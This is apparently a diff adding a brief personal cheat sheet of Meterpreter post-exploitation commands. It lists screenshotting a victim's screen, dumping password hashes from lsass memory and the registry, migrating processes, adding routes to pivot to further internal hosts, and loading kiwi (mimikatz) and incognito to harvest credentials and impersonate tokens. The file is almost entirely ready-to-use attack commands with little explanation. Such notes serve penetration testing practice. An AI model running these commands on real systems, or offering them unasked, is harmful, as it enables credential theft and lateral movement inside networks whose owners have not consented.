@@ -1,0 +1,45 @@
+Meterpreter Commands:
+---------------------
+
+screenshot -p /tmp/their_screen.jpg
+hashdump  -  pulls from memory (lsass)
+run hashdump - pulls from registry*
+migrate - change process to new process ID:  migrate [ID] 
+
+
+Route Pivoting:  Background the session first
+---------------------------------------------
+Route add [IP address of next target] [255.255.255.255] [session ID]
+example:  route add 10.10.10.20 255.255.255.255 1
+
+
+
+Modules: first type "load"
+--------------------------
+msfmap  - stripped version of nmap
+kiwi	- mimikatz  (type: creds_all)
+incognitio - impersonate tokens
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+* If Hashdump doesnt work:  (Pulls from registry)
+meterpreter > run post/windows/gather/hashdump 
+
+
+
